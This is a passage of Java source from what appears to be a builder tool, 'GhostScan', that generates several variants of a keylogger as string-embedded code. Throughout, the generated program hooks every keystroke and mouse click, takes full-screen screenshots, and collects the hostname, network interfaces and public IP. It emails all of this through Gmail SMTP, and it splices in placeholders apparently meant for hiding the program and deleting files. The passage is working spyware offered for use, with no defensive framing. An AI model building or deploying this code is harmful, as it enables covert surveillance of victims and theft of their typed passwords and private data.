										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e) {"
												
											+"e.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											+"try{"
											+"Robot robot = new Robot();"  
											            
											+"Toolkit toolkit = Toolkit.getDefaultToolkit();"  
											+"final Dimension dimension = toolkit.getScreenSize();"  
											             
											                 
											+"BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));"  
											+"try{"
											+"ImageIO.write(bi, "+'"'+"JPEG"+'"'+", new File("+'"'+"camera.JPEG"+'"'+"));"
											+"}catch(IOException ey){"
											+"ey.printStackTrace();"
											+"}"
											           
											+"}catch (AWTException e1) {"
														
											+"e1.printStackTrace();"
											+"}"
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='blue'>ip: </font>"+'"'+"+getIP()+"+'"'+"</p><p><font color='red'>O mouse foi clicado em: </font>"+'"'+"+mouse+"+'"'+"<br><br><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"<br><br><br><b>"+'"'+"+info+"+'"'+"</b><br>"+'"'+"+computerName+"+'"'+"<br><b>"+'"'+"+placa+"+'"'+"</b><br><b>"+'"'+"+rede+"+'"'+"</b><br><br><font color='red'>"+'"'+"+iface1+"+'"'+"</font><br><font color='green'><i>"+'"'+"+address1+"+'"'+"</i></font><br><font color='blue'>"+'"'+"+bc1+"+'"'+"</font><br><font color='gray'>"+'"'+"+mask1+"+'"'+"</font></p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										+"EmailAttachment anexo = new EmailAttachment();"
										+"anexo.setPath("+'"'+"camera.JPEG"+'"'+");"
										+"anexo.setDisposition(EmailAttachment.ATTACHMENT);"
										+"anexo.setName("+'"'+"camera.JPEG"+'"'+");"
												+"try {"
												+"email.attach(anexo);"
												+"} catch (EmailException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"			
									
								    
+init    
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile						
+ocult							


								    
									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoRegRed = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.awt.Robot;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											+"try{"
											+"Robot robot = new Robot();"  
											            
											+"Toolkit toolkit = Toolkit.getDefaultToolkit();"  
											+"final Dimension dimension = toolkit.getScreenSize();"  
											             
											                 
											+"BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));"  
											+"try{"
											+"ImageIO.write(bi, "+'"'+"JPEG"+'"'+", new File("+'"'+"camera.JPEG"+'"'+"));"
											+"}catch(IOException ey){"
											+"ey.printStackTrace();"
											+"}"
											           
											+"}catch (AWTException e) {"
														
											+"e.printStackTrace();"
											+"}"
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='red'>O mouse foi clicado em: </font>"+'"'+"+mouse+"+'"'+"<br><br><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"<br><br><br><b>"+'"'+"+info+"+'"'+"</b><br>"+'"'+"+computerName+"+'"'+"<br><b>"+'"'+"+placa+"+'"'+"</b><br><b>"+'"'+"+rede+"+'"'+"</b><br><br><font color='red'>"+'"'+"+iface1+"+'"'+"</font><br><font color='green'><i>"+'"'+"+address1+"+'"'+"</i></font><br><font color='blue'>"+'"'+"+bc1+"+'"'+"</font><br><font color='gray'>"+'"'+"+mask1+"+'"'+"</font></p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										+"EmailAttachment anexo = new EmailAttachment();"
										+"anexo.setPath("+'"'+"camera.JPEG"+'"'+");"
										+"anexo.setDisposition(EmailAttachment.ATTACHMENT);"
										+"anexo.setName("+'"'+"camera.JPEG"+'"'+");"
												+"try {"
												+"email.attach(anexo);"
												+"} catch (EmailException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"				
									
								    
								    
+init		
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile					
+ocult					


									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoSrcIp = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.awt.Robot;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											+"try{"
											+"Robot robot = new Robot();"  
											            
											+"Toolkit toolkit = Toolkit.getDefaultToolkit();"  
											+"final Dimension dimension = toolkit.getScreenSize();"  
											             
											                 
											+"BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));"  
											+"try{"
											+"ImageIO.write(bi, "+'"'+"JPEG"+'"'+", new File("+'"'+"camera.JPEG"+'"'+"));"
											+"}catch(IOException ey){"
											+"ey.printStackTrace();"
											+"}"
											           
											+"}catch (AWTException e1) {"
														
											+"e1.printStackTrace();"
											+"}"
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='blue'>ip: </font>"+'"'+"+getIP()+"+'"'+"</p><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"</p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										+"EmailAttachment anexo = new EmailAttachment();"
										+"anexo.setPath("+'"'+"camera.JPEG"+'"'+");"
										+"anexo.setDisposition(EmailAttachment.ATTACHMENT);"
										+"anexo.setName("+'"'+"camera.JPEG"+'"'+");"
												+"try {"
												+"email.attach(anexo);"
												+"} catch (EmailException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"		
									
								    
+init    
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile							
+ocult							


								    
									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoSrcRed = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.awt.Robot;"
							+"import java.awt.Toolkit;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
